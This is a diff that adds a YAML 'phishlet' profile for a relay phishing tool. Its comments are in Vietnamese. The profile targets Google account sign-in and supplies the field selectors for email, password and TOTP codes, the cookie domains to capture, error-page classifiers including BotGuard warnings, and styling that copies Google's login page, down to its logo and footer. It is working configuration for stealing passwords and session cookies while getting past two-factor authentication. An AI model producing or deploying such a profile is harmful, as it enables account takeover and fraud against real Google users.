@@ -1,0 +1,32 @@
+# google.yaml — relay profile cho Google (flow chuyên dụng, KHÔNG đổi hành vi)
+# flow: google giữ nguyên state machine số hữu của bgrelay (identifier →
+# password → totpPin/number-match prompt → done mail.google.com).
+phishlet: google
+flow: google
+signin_url: "https://accounts.google.com/ServiceLogin?hl={hl}&continue=https%3A%2F%2Fmail.google.com%2F"
+done_hosts: ["mail.google.com", "myaccount.google.com"]
+cookie_domains: ["google.com"]
+asset_hosts: ["gstatic.com", "googleapis.com", "googleusercontent.com", "google.com", "google.vn"]
+reopen_url: "https://mail.google.com"
+inputs:            # thứ tự ưu tiên detect (password trước, như INPUT_SELS cũ)
+  password: "input[name='Passwd'], input[type='password']"
+  email: "#identifierId"
+  code: "input[name='totpPin'], input[type='tel']"
+buttons:
+  next: ["#identifierNext button", "#passwordNext button", "#totpNext button", "button:has-text('Next')"]
+classify:
+  challenge: ["enter a code", "nhập mã", "mã xác minh", "verify it", "2-step", "xác minh 2 bước"]
+  bad_account: ["couldn't find", "couldn’t find", "không tìm thấy"]
+  wrong_password: ["wrong password", "mật khẩu không chính xác"]
+  botguard: ["not be secure", "không an toàn"]
+page:
+  title: "Sign in - Google Accounts"
+  favicon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iI0VBNDMzNSIgZD0iTTI0IDkuNWMzLjU0IDAgNi43MSAxLjIyIDkuMjEgMy42bDYuODUtNi44NUMzNS45IDIuMzggMzAuNDcgMCAyNCAwIDE0LjYyIDAgNi41MSA1LjM4IDIuNTYgMTMuMjJsNy45OCA2LjE5QzEyLjQzIDEzLjcyIDE3Ljc0IDkuNSAyNCA5LjV6Ii8+PHBhdGggZmlsbD0iIzQyODVGNCIgZD0iTTQ2Ljk4IDI0LjU1YzAtMS41Ny0uMTUtMy4wOS0uMzgtNC41NUgyNHY5LjAyaDEyLjk0Yy0uNTggMi45Ni0yLjI2IDUuNDgtNC43OCA3LjE4bDcuNzMgNmM0LjUxLTQuMTggNy4wOS0xMC4zNiA3LjA5LTE3LjY1eiIvPjxwYXRoIGZpbGw9IiNGQkJDMDUiIGQ9Ik0xMC41MyAyOC41OWMtLjQ4LTEuNDUtLjc2LTIuOTktLjc2LTQuNTlzLjI3LTMuMTQuNzYtNC41OWwtNy45OC02LjE5Qy45MiAxNi40NiAwIDIwLjEyIDAgMjRjMCAzLjg4LjkyIDcuNTQgMi41NiAxMC43OGw3Ljk3LTYuMTl6Ii8+PHBhdGggZmlsbD0iIzM0QTg1MyIgZD0iTTI0IDQ4YzYuNDggMCAxMS45My0yLjEzIDE1Ljg5LTUuODFsLTcuNzMtNmMtMi4xNSAxLjQ1LTQuOTIgMi4zLTguMTYgMi4zLTYuMjYgMC0xMS41Ny00LjIyLTEzLjQ3LTkuOTFsLTcuOTggNi4xOUM2LjUxIDQyLjYyIDE0LjYyIDQ4IDI0IDQ4eiIvPjwvc3ZnPg=="
+  button_label: "Next"
+  accent: "#0b57d0"
+  text: "#202124"
+  muted: "#5f6368"
+  line: "#dadce0"
+  card_radius: 24
+  footer_left: "English (United States)"
+  footer_right: "Help   Privacy   Terms"
